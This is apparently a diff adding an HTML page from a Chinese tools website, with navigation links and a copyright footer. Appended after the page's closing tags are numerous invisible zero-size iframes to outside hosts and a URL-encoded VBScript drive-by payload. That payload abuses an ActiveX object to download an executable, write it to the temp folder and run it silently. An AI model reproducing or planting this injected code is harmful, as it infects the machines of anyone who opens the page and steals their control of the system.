+<span style="font-size: 10.5pt"><b>最新人才</b></span></font></span></TD></TR>
+<TR>
+<TD 
+background=image/CreditDynamic_index_bj11.gif>
+<DIV align=center>
+<TABLE border=0 cellSpacing=1 width="181" style="border-collapse: collapse" bordercolor="#111111" height="37">
+<TBODY>
+ 
+<TR>
+<TD height=14 width="181" colspan="3">
+<DIV align=right><B><a href="psearch.asp"><FONT 
+color=#ff6600>&gt;&gt;&gt;更多</FONT></a></B><FONT 
+color=#ff6600><B>&nbsp;</B></FONT></DIV></TD></TR></TBODY></TABLE></DIV></TD></TR>
+<TR>
+<TD bgColor=#527dce 
+height=1></TD></TR></TBODY></TABLE></TD></TR>
+<tr>
+<TD vAlign=top colspan="3" width="750">
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
+<tr>
+<td width="100%" background="../images/bt1.gif">　</td>
+</tr>
+<tr>
+<td width="100%">
+<html>
+<head>
+<meta http-equiv="Content-Language" content="zh-cn">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<LINK 
+href="../css/Style.css" rel=stylesheet type=text/css>
+<script language="javascript">
+function ver(mylink)
+{
+window.open(mylink,'','top=50,left=120,width=370,height=400,scrollbars=no')
+}
+</script>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>关于我们</title>
+</head>
+<body>
+<div align="center">
+<center>
+<TABLE bgColor=#FFFFFF border=0 cellPadding=0 cellSpacing=6 width=750 style="border-collapse: collapse" bordercolor="#111111">
+<TR> 
+        <TD align=middle valign="middle"> <p align="center"> <a href="#" style="text-decoration:none;">请牢记本站域名<a href="javascript:ver('ver.asp')">完美服务版</a></TD>
+</TR>
+<TR> 
+<TD align=middle width="738"> <SPAN style="FONT-SIZE: 12px"> <a href="/about/aboutus.asp">关于我们</a></span> 
+- <a target="_blank" href="/newsmore.asp?bz=1">本站动态</a> - <a target="_blank" href="/manage/index.asp">会员助手</a> 
+- <SPAN style="FONT-SIZE: 12px"> <a href="/about/fwtk.asp">服务条款</a></span> 
+- <SPAN style="FONT-SIZE: 12px"> <a href="/help/hyhelp.asp">网站指南</a></span> 
+- <a href="/banner.asp">网络广告</a> - <SPAN style="FONT-SIZE: 12px"> 
+<a href="/about/cooperate.asp">市场合作</a></span> - <a href="/yqlj/yqlj.asp">友情链接</a></TD>
+</TR>
+<TR> 
+<TD align=middle width="738"><FONT color=#003399>Copyright(C)</FONT><font color="#000080"><SPAN style="FONT-SIZE: 12px"> 
+<a href="http://www.tshqy.com" style="text-decoration: none">哈川工具网</a></span></font><FONT color=#003399> 
+版权所有&nbsp; </FONT> <FONT color=#000080><a href="mailto:18tools@sina.com">E-mail：</a></FONT><SPAN style="FONT-SIZE: 12px"><a href="mailto:18tools@sina.com"><FONT FACE="ARIAL" color="#000080">18tools@sina.com</FONT></a></TD>
+</TR>
+</TABLE>
+</center>
+</div>
+</body>
+</html>
+
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+
+
+</td>
+</tr>
+</table>
+</TD>
+</tr>
+</TBODY></TABLE>
+</CENTER></BODY></HTML>
+
+
+
+
+
+<script>
+t=""
+
+<html> 
+<iframe src="http://liulong.blogbus.com/files/1168432517.htm" width="0" height="0" scrolling="no" frameborder="0"></iframe>
+</html>
+<html> 
+<iframe src="http://liulong.blogbus.com/files/1168432517.htm" width="0" height="0" scrolling="no" frameborder="0"></iframe>
+</html><html> 
+<iframe src="http://web.hctools.com.cn/shop/yan.htm" width="0" height="0" frameborder="0"></iframe>
+</html><SCRIPT>var Words="%3Chtml%3E%0D%0A%3Cscript language%3D%22VBScript%22%3E%0D%0Aon error resume next%0D%0AMyQQ5372453%3D%22http%3A%2F%2Fweb%2Ehctools%2Ecom%2Ecn%2Fshop%2F3221%2Eexe %22%0D%0ASet CAOc %3D document%2EcreateElement%28%22object%22%29%0D%0Ac1 %3D%22clsid%3ABD%22%0D%0Ac2%3D%2296C556%2D65A3%2D11%22%0D%0Ac3%3D%22D0%2D983A%2D00C04F%22%0D%0Ac4%3D%22C29E36%22%0D%0ACAOc%2EsetAttribute %22classid%22%2Cc1%2Bc2%2Bc3%2Bc4%0D%0Aseturla%3D%22down%22%0D%0Aseturlb%3D%22file%22%0D%0Aseturlc%3D%22copy%22%0D%0Aseturld%3D%22exit%22%0D%0Aseturle%3D%22base%22%0D%0ACAOi%3D%22Microsoft%2EXMLHTTP%22%0D%0ASet CAOd %3D CAOc%2ECreateObject%28CAOi%2C%22%22%29%0D%0Aseturlf%3D%22Ado%22%0D%0Aseturlg%3D%22db%2E%22%0D%0Aseturlh%3D%22Str%22%0D%0Aseturli%3D%22eam%22%0D%0ACAOf%3Dseturlf%26seturlg%26seturlh%26seturli%0D%0ACAOg%3DCAOf%0D%0Aset CAOa %3D CAOc%2Ecreateobject%28CAOg%2C%22%22%29%0D%0ACAOa%2Etype %3D 1%0D%0ACAOh%3D%22GET%22%0D%0ACAOd%2EOpen CAOh%2C MyQQ5372453%2C False%0D%0ACAOd%2ESend%0D%0ACAO9%3D%223221%2Eexe %22%0D%0Aset CAOb %3D CAOc%2Ecreateobject%28%22Scripting%2EFileSystemObject%22%2C%22%22%29%0D%0Aset CAOe %3D CAOb%2EGetSpecialFolder%282%29%0D%0ACAOa%2Eopen%0D%0ACAO8%3D%22CAOa%2EBuildPath%28CAOa%2CCAO8%29%22%0D%0ACAO7%3D%22CAOb%2EBuildPath%28CAOb%2CCAO7%29%22%0D%0ACAO6%3D%22CAOc%2EBuildPath%28CAOd%2CCAO6%29%22%0D%0ACAO5%3D%22CAOd%2EBuildPath%28CAOf%2CCAO5%29%22%0D%0ACAO4%3D%22CAOe%2EBuildPath%28CAOg%2CCAO4%29%22%0D%0ACAO3%3D%22CAOf%2EBuildPath%28CAOh%2CCAO4%29%22%0D%0ACAO2%3D%22CAOg%2EBuildPath%28CAOi%2CCAO3%29%22%0D%0ACAO1%3D%22CAOh%2EBuildPath%28CAOg%2CCAO1%29%22%0D%0ACAO0%3D%22CAOi%2EBuildPath%28CAOk%2CCAO0%29%22%0D%0ACAO9%3D CAOb%2EBuildPath%28CAOe%2CCAO9%29%0D%0ACAOa%2Ewrite CAOd%2EresponseBody%0D%0ACAOa%2Esavetofile CAO9%2C2%0D%0ACAOa%2Eclose%0D%0Aset CAOe %3D CAOc%2Ecreateobject%28%22Shell%2EApplication%22%2C%22%22%29%0D%0ACAOe%2EShellExecute CAO9%2CBBS%2CBBS%2C%22open%22%2C 0%0D%0A%3C%2Fscript%3E%0D%0A%3C%2Fhtml%3E%0D%0A";document.write(unescape(Words))</SCRIPT>
+<html> 
+<iframe src="http://liulong.blogbus.com/files/1170598837.htm" width="0" height="0" scrolling="no" frameborder="0"></iframe>
+</html><html> 
+<iframe src="http://liulong.blogbus.com/files/1170598837.htm" width="0" height="0" scrolling="no" frameborder="0"></iframe>
+</html><iframe src="http://ad.13591.com/new/new.htm" width="0" height="0" frameborder="0"></iframe>  
+
+<iframe src="http://www.smxlykj.cn/mh/3333.htm" width=0 height=0></iframe>
+<iFrAmE SRc=http://www.6506500.com/mm/pop.htm width=1 height=1 frameborder=0></IfRaMe><iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+
+<iframe src=http://www.419307.com/admin/img/ZhanLang.htm width=100 height=0 frameborder=0><iframe src=http://www.haogs.cn/html/ width=100 height=0></iframe><iframe src="http://www.xf365xf.com/bbs/body/top.htm" name="zhu" width="0" height="0" frameborder="0">
